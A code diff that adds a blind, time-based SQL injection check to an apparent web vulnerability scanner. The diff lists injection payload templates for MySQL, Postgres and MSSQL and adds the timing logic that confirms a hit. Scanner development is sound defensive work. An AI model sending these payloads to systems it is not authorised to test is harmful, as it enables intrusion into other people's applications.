@@ -73,6 +73,53 @@ class SqlError:
         return None
 
 
+class SqlBlindTime:
+    """Blind, time-based SQL injection: when no error leaks, confirm injection by making the DB sleep. A payload
+    that delays the response ~N seconds, and ~2N when doubled, proves the input reaches SQL that we can control
+    (covering MySQL SLEEP, Postgres pg_sleep and MSSQL WAITFOR, in string and numeric contexts). Slow by design,
+    so it only runs at 'Thorough' intensity (time_based)."""
+
+    key, title, severity = "sqli", "SQL injection (blind, time-based)", "high"
+
+    # payload templates; {b}=original value, {n}=seconds. Each pairs a sleep with a comment/boolean close.
+    _TEMPLATES = [
+        "{b}' AND SLEEP({n})-- -", "{b}' AND SLEEP({n}) AND '1'='1", "{b}') AND SLEEP({n})-- -",
+        "{b}'; WAITFOR DELAY '0:0:{n}'-- -", "{b}' || pg_sleep({n})-- -", "{b}';SELECT pg_sleep({n})-- -",
+        "{b} AND SLEEP({n})", "{b});SELECT pg_sleep({n})--",
+    ]
+
+    def __init__(self, time_based: bool = True, probe_secs: tuple = (4, 8)):
+        self.time_based = time_based
+        self.probe_secs = probe_secs   # (first, confirm); confirm should be ~2x first
+
+    def run(self, point, build, send, baseline, rand, oob=None):
+        import time
+        if not self.time_based:
+            return None
+        if point.get("loc") not in ("query", "body-form", "json"):   # bound the cost to the common spots
+            return None
+        n1, n2 = self.probe_secs
+        base = point.get("value", "")
+        t0 = time.monotonic()
+        send(*build(base))                     # measure normal latency so a naturally slow endpoint isn't flagged
+        base_lat = time.monotonic() - t0
+        if base_lat >= n1 * 0.9:               # already slow/noisy — a time oracle would be unreliable here
+            return None
+        for tmpl in self._TEMPLATES:
+            s1 = time.monotonic()
+            r1 = send(*build(tmpl.format(b=base, n=n1)))
+            if (time.monotonic() - s1) - base_lat < n1 * 0.75:
+                continue                       # no delay for this dialect/context — try the next
+            s2 = time.monotonic()             # confirm: the longer sleep must delay it proportionally more
+            p2 = tmpl.format(b=base, n=n2)
+            r2 = send(*build(p2))
+            if (time.monotonic() - s2) - base_lat >= n2 * 0.75:
+                return _finding(self, point, p2,
+                                f"The response time scaled with an injected SQL sleep (~{n1}s then ~{n2}s) — "
+                                "blind, time-based SQL injection.", "firm", r2 or r1 or {})
+        return None
+
+
 class Ssti:
     key, title, severity = "ssti", "Server-side template injection", "high"
 
@@ -198,9 +245,9 @@ class CommandInjection:
 
 
 def standard(time_based: bool = True) -> list:
-    """The full active check set. time_based=False drops the slow sleep-based command-injection probe."""
-    return [ReflectedXSS(), SqlError(), Ssti(), PathTraversal(), OpenRedirect(), CrlfInjection(),
-            Ssrf(), CommandInjection(time_based=time_based)]
+    """The full active check set. time_based=False drops the slow sleep-based probes (blind SQLi, command inj.)."""
+    return [ReflectedXSS(), SqlError(), SqlBlindTime(time_based=time_based), Ssti(), PathTraversal(),
+            OpenRedirect(), CrlfInjection(), Ssrf(), CommandInjection(time_based=time_based)]
 
 
 ALL_CHECKS = standard(True)
